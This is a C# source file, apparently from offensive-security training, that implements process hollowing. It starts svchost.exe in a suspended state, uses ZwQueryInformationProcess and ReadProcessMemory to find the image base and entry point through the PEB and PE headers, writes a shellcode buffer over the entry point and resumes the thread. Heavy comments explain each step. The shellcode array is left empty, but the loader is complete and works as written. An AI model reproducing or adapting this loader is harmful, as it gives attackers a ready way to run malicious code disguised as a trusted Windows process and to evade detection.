using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace Hollow
{
    /*
     * Make sure to compile with 64-bit architecture
     * 
     */
    internal class Program
    {
        /*
         * Required for CreateProcess.
         * https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-startupinfow
         * 
         * Contain a number of values related to how the window of a new process should be configured. 
         * 
         * Check out P/Invoke for the type chooses.
         */
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi)]
        struct STARTUPINFO
        {
            public Int32 cb;
            public IntPtr lpReserved;
            public IntPtr lpDesktop;
            public IntPtr lpTitle;
            public Int32 dwX;
            public Int32 dwY;
            public Int32 dwXSize;
            public Int32 dwYSize;
            public Int32 dwXCountChars;
            public Int32 dwYCountChars;
            public Int32 dwFillAttribute;
            public Int32 dwFlags;
            public Int16 wShowWindow;
            public Int16 cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        /*
         *  Required for CreateProcess.
         *  https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-process_information
         *  
         *  Structure that is populated by CreateProcessW with identification information about the new process, including the process ID and a handle to the process.
         *  
         *  Check out P/Invoke for the type chooses.
         */
        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
        static extern bool CreateProcess(
            /*
             * THe name of the module to be executed.
             * 
             * Can be window-based app or other form of type of module, so long as its appropraite to the system.
             * 
             * Specify the full path and file name of the module to execute... or a partial name.
             * In partial search, the function uses current drive and current directory to complete the specification.
             * 
             * Can be NULL.
             */
            string lpApplicationName, 
            /*
             *  The maximum length of the string is 32,767 characters.
             *  
             *  The command line to be executed.
             *  
             *  Can be null.
             */
            string lpCommandLine,
            
            //refer to https://learn.microsoft.com/en-us/windows/win32/api/wtypesbase/ns-wtypesbase-security_attributes
            IntPtr lpProcessAttributes, //A pointer to a SECURITY_ATTRIBUTES structure that determines whether the returned handle to the new process object can be inherited by child processes
            IntPtr lpThreadAttributes, //A pointer to a SECURITY_ATTRIBUTES structure that specifies a security descriptor for the new thread and determines whether child processes can inherit the returned handle.
            bool bInheritHandles, //Whether the handle can be inherited
            
            //https://learn.microsoft.com/en-us/windows/win32/procthread/process-creation-flags
            uint dwCreationFlags, //The flags that control the priority class and the creation of the process.
            IntPtr lpEnvironment, // A pointer to the environment block for the new process. If this parameter is NULL, the new process uses the environment of the calling process.
            string lpCurrentDirectory, //The full path to the current directory for the process. The string can also specify a UNC path.
            
            //https://learn.microsoft.com/en-us/windows/desktop/api/processthreadsapi/ns-processthreadsapi-startupinfow
            //https://learn.microsoft.com/en-us/windows/desktop/api/winbase/ns-winbase-startupinfoexw
            [In] ref STARTUPINFO lpStartupInfo, // A pointer to a STARTUPINFO or STARTUPINFOEX structure.

            //https://learn.microsoft.com/en-us/windows/desktop/api/processthreadsapi/ns-processthreadsapi-process_information
            out PROCESS_INFORMATION lpProcessInformation //A pointer to a PROCESS_INFORMATION structure that receives identification information about the new process.
        );

        /*
         * Required for ZwQueryInformationProcess
         * Information about the structure: https://learn.microsoft.com/en-us/windows/win32/procthread/zwqueryinformationprocess
         * 
         * View the translation to C# from P/Invoke
         * 
         * This structure holds information about the process. 
         * 
         * Notably, the structure is SIX pointers. 
         */
        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_BASIC_INFORMATION
        {
            public IntPtr Reserved1;
            public IntPtr PebAddress;
            public IntPtr Reserved2;
            public IntPtr Reserved3;
            public IntPtr UniquePid;
            public IntPtr MoreReserved;
        }

        /*
         *  To locate EntryPoint by first disclosing the PEB via this function.
         *  https://learn.microsoft.com/en-us/windows/win32/procthread/zwqueryinformationprocess
         * 
         *  hProcess - Handle to the process for which information is to be retrieved.
         *  ProcessInformationClass - The type of process information to be retrieved. Check the documentation for the value listing
         *  Process Information - A pointer to a buffer supplied by the calling application.
         *  Process Information Length - Size of the buffer pointed to by ProcessInformation, in bytes. 
         *  ReturnLength - A pointer to a variable which function returns the size of the requested information.
         *  
         */
        [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
        private static extern int ZwQueryInformationProcess(
            IntPtr hProcess,
            int procInformationClass,
            ref PROCESS_BASIC_INFORMATION procInformation,
            uint ProcInfoLen, 
            ref uint retlen
        );

        /**
         *  Using to fetch the address of the code base by reading eight bytes of memory. 
         *  
         * 
         */
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool ReadProcessMemory(
            IntPtr hProcess, //process handle
            IntPtr lpBaseAddress, //address to read from
            [Out] byte[] lpBuffer, //buffer to copy the content into
            int dwSize, //number of bytes to read
            out IntPtr lpNumberOfBytesRead //varaible to contain the number of bytes read
        );

        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(
            IntPtr hProcess, 
            IntPtr lpBaseAddress, 
            byte[] lpBuffer, 
            Int32 nSize, 
            out IntPtr lpNumberOfBytesWritten
        );

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern uint ResumeThread(IntPtr hThread);

        static void Main(string[] args)
        {
            STARTUPINFO si = new STARTUPINFO();
            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();

            /*
             * VERY IMPORTANT - Set 0x4 (CREATE_SUSPENDED) to ensure the process created is suspended. Else this will fail.
             */
            bool res = CreateProcess(null, "C:\\Windows\\System32\\svchost.exe", IntPtr.Zero,
                IntPtr.Zero, false, 0x4, IntPtr.Zero, null, ref si, out pi);

            if (!res)
            {
                Console.WriteLine("Failed to create process.");
            }

            PROCESS_BASIC_INFORMATION bi = new PROCESS_BASIC_INFORMATION();
            uint tmp = 0;
            IntPtr hProcess = pi.hProcess;
            
            /*
             *  For ProcessInformationLength, we're providing IntPtr.Size * 6 for couple reasons.
             *      1. IntPtr.Size returns a size of the pointer which changes depending if the system is 32/64 bits
             *      2. Multiplying by six so the size is matching the expected size of the PROCESS_BASIC_INFORMATION
             * 
             *  We're referring bi (PROCESS_BASIC_INFORMATION) to store the possible EntryPoint that we'll need later.
             */
            ZwQueryInformationProcess(hProcess, 0, ref bi, (uint)(IntPtr.Size * 6), ref tmp);

            /*
             *  Because PROCESS_BASIC_INFORMATION has information about the PEB address, we can then find base address of the exectuable at offset 0x10 into the PEB.
             *  THis is always true with PE file format.
             *  
             *  Note: This is to find the field housing base address of the executable. We'll need to read this field to get the ACTUAL base address of the executable.
             */
            IntPtr ptrToImageBase = (IntPtr)((Int64)bi.PebAddress + 0x10);

            //Address buffer of the size of a int pointer. The size depends on from 32/64 bit
            // 4 bytes for 32 bit
            // 8 bytes for 64 bit
            byte[] addrBuf = new byte[IntPtr.Size];
            
            IntPtr nRead = IntPtr.Zero;

            /*
             * The next eight bytes of memory is read and stored into the addrBuf. Note we'll need to use ReadProcessMemory since we're reading from a remote process.
             * This allows us to read out the contents of the remote PEB at offset 0x10.
             * 
             * We'll pass the process handle and the address of the base address field inside the PEB.
             * from here, we'll read the next eight bytes of the field and store them to addrbuf. What's stored is the actual base address of the executable.
             * 
             */
            ReadProcessMemory(hProcess, ptrToImageBase, addrBuf, addrBuf.Length, out nRead);

            /*
             *  An 8-byte buffer that is then converted to a 64bit integer, now treating this as a memory address pointed at. 
             *  Note: Memory address takes up eight bytes in 64-bit process, 4 bytes in 32-bit process. Adapt to the bit architect of the process.
             * 
             *  This pointer will not hold the location of the base address of the svchost.exe
             * 
             */
            IntPtr svchostBase = (IntPtr)(BitConverter.ToInt64(addrBuf, 0));

            /*
             * We'll be creating another buffer with 0x200 bytes size, this is where we'll house the DOS Header and PE header.
             * The PE header and its structure fits within the first x200 bytes of the executable image in memory.
             * 
             * Because we have the base address of the executable (svchostBase), we can start from there and read the next 0x200 bytes.
             * Process Envrionment Block https://en.wikipedia.org/wiki/Process_Environment_Block
             */
            byte[] data = new byte[0x200];
            ReadProcessMemory(hProcess, svchostBase, data, data.Length, out nRead);


            /*
             * The e_lfanew field is located at offset 0x3C, and this field contains the offset from the beginning of the PE (image base) to the PE header.
             * 
             * Due note:
             *  THe PE file format starts with DOS header, which includes the e_lfanew field at offset 0x3C.
             *  The e_lfanew CONTAINS the offset to the PE Header from the PE image base. 
             *  We'll read this field to obtain the offset.
             * 
             * To start, we'll convert the four bytes at offset 0x3C from data (image base) to an unsigned integer.  
             * Keep in mind, the PE file format defines e_lfanew as a 4-byte unsigned integer. It holds 4 bytes with non-negative numbers.
             * 
             */
            uint e_lfanew_offset = BitConverter.ToUInt32(data, 0x3C);
            
            /*
             * e_lfanew_offset is the offset to the PE header from the start of the PE image.
             *      We get this offset from the e_lfanew field that resides in the DOS header at offset 0x3C.
             *      
             * The PE header contains additionals headers such as File Header and Optional Header.
             * 
             * The Optional Header starts at a fixed offset 0x18 bytes after the start of the PE header.
             * Within the Optional Header, at offset 0x10, is the Address of Entry Point field.
             *      This field contains the address to the address of the entry point RVA (relative virtual address)
             * 
             * Adding the two offsets together yields an offset of 0x28 from the PE header to the AddressOfEntryPoint field.
             * 
             */
            uint opthdr = e_lfanew_offset + 0x28;
            
            /*
             * At opthdr offset from start of the PE header, we'll read the next 4 bytes and convert them to an unsigned 32 bits.
             * The EntryPoint RVA is a 4-byte unsigned integer in the PE Optional Header.
             * This will extract the RVA entrypoint to tell you where the exectuable's entry point is located relative to the image base.
             * 
             */
            uint entrypoint_rva = BitConverter.ToUInt32(data, (int)opthdr);
            
            /*
             * Take the offset from the base address of svchostBase (svchose.exe) to the entry point to get the relative virtual address (RVA).
             * This is full memeory address of the Entry Point.
             * 
             * svchostBase is casted as 64-bit unsigned integer to be added to the RVA.
             * We make sure to case the result as IntPtr to point to the address.
             * 
             */
            IntPtr addressOfEntryPoint = (IntPtr)(entrypoint_rva + (UInt64)svchostBase);
            
            //Add shellcode
            byte[] buf = new byte[] { 
                
            };

            //Write shellcode to memory address of the entry point
            WriteProcessMemory(hProcess, addressOfEntryPoint, buf, buf.Length, out nRead);

            ResumeThread(pi.hThread);

        }
    }
}
